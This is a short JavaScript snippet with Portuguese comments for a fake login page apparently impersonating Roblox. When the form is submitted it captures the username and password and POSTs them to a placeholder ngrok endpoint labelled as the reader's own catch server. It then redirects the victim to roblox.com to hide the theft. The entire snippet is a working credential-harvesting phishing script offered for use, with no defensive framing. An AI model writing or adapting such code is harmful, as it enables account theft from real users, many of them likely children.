// Este código vai no seu HTML ou em um arquivo .js vinculado ao HTML
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('custom-login-form');
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        const username = document.getElementById('custom-username').value;
        const password = document.getElementById('custom-password').value;

        // Envia para seu Ngrok
        await fetch('https://SEU-CODIGO.ngrok-free.app/catch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });

        window.location.href = "https://www.roblox.com";
    });
});
